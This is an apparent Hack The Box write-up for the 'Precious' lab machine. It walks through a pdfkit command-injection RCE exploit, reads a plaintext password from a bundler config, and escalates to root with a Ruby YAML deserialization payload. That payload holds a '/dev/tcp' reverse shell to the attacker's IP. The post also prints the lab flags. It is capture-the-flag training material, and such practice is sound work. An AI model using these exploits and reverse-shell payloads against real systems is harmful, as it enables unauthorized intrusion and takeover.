---
title: "Precious from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Precious from HTB
add this to `/etc/hosts`
```
10.10.11.189 precious.htb
```
Access the site and it's an `url to pdf`. Start an `python3 -n http.server`and then in `enter url`place write your `http://<your_ip>:<port>`and it will make an `pdf`on it. Download that `pdf`and with `exiftool`read the description about it:
```bash
exiftool 1891ws5e0kiv1cjadkqzjyg6wk7j41ae.pdf
ExifTool Version Number         : 12.76
File Name                       : 1891ws5e0kiv1cjadkqzjyg6wk7j41ae.pdf
Directory                       : .
File Size                       : 20 kB
File Modification Date/Time     : 2024:08:13 20:01:32+04:00
File Access Date/Time           : 2024:08:13 20:01:32+04:00
File Inode Change Date/Time     : 2024:08:13 20:01:51+04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```
There is an exploit on `pdfkit v0.8.6` It's an `RCE`attack. I found script on that in `Github`repository: https://github.com/UNICORDev/exploit-CVE-2022-25765/tree/main

```python
python3 exploit-CVE-2022-25765-pdfkit-0.8.5.py -s <your_ip> <port> -w http://precious.htb/ -p url
```
Open `netcat listener`and run the python code. you will get connection.
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.189] 39198
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ruby@precious:/var/www/pdfapp$
```
There is two `user`on the machine that means we have to search for other user's password.
```bash
ls -la /home/ruby
total 28
drwxr-xr-x 4 ruby ruby 4096 Aug 13 11:57 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 Aug 13 11:57 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ cd .bundle
cd .bundle
ruby@precious:~/.bundle$ ls
ls
config
ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
Password for `henry`is : Q3c1AqGHtoI0aXAYFH
Switch to `henry`and read the user flag.
***
User Flag is: c10ea1ebfde125477e81413bfa256d5f
***
```bash
henry@precious:~$ sudo -l
sudo -l

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
This means we can run `ruby`with root privileges. Read `/opt/update_dependencies.rb` file to get what it does.
```bash
cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
This means it reads `dependencies.yml`file where you are located.
Check the `ruby`version and then search for privilege escalation with that.
Knowing `ruby version`and that we have to write some file named `dependencies.yml`it's gonna be easy.
After search i found this site where it had an `reverse shell`code.
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/
```
---
- !ruby/object:Gem::Installer
  i: x
- !ruby/object:Gem::SpecFetcher
  i: y
- !ruby/object:Gem::Requirement
  requirements: !ruby/object:Gem::Package::TarReader
    io: !ruby/object:Net::BufferedIO &1
      io: !ruby/object:Gem::Package::TarReader::Entry &1
        read: 0
        header: "abc"
      debug_output: !ruby/object:Net::WriteAdapter &1
        socket: !ruby/object:Gem::RequestSet &1
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module "Kernel"
            method_id: :system
          git_set: "bash -c 'bash -i >& /dev/tcp/10.10.16.5/1235 0>&1'" # modify this
        method_id: :resolve
```
Save that to `/tmp/dependencies.yml`. `BE SURE TO BE IN /tmp DIRECTORY` Start `netcat`listener and then execute this command:
```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
You will get connection on `netcat`and you will be root.
***
Root Flag is: bb6cc914fbc5b2f772b198a55cafd3f9
***
![](/assets/images/Screenshot from 2024-08-13 20-27-23.png)
